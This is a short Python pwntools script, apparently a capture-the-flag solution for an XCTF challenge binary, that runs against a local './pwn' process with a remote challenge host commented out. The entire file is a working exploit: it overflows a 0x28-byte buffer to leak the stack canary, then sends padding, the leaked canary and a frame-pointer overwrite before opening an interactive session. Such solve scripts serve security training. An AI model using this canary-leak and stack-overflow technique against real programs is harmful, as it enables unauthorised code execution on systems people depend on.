from pwn import *
context.arch = 'amd64'
context.log_level='debug'
context.terminal = ['tmux','split','-hp','60']

# io = remote("pwn-25fe885e13.challenge.xctf.org.cn", 9999, ssl=True)
io = process('./pwn')
io.sendline(b'a'*0x28)
io.recvuntil(b'a'*0x28)
canary=u64(io.recv(8))-0xa
success(hex(canary))

payload=b'a'*0x28+p64(canary)+p64(0)+b'\x0A'
io.recvuntil(b':\n')
io.send(payload)
io.interactive()
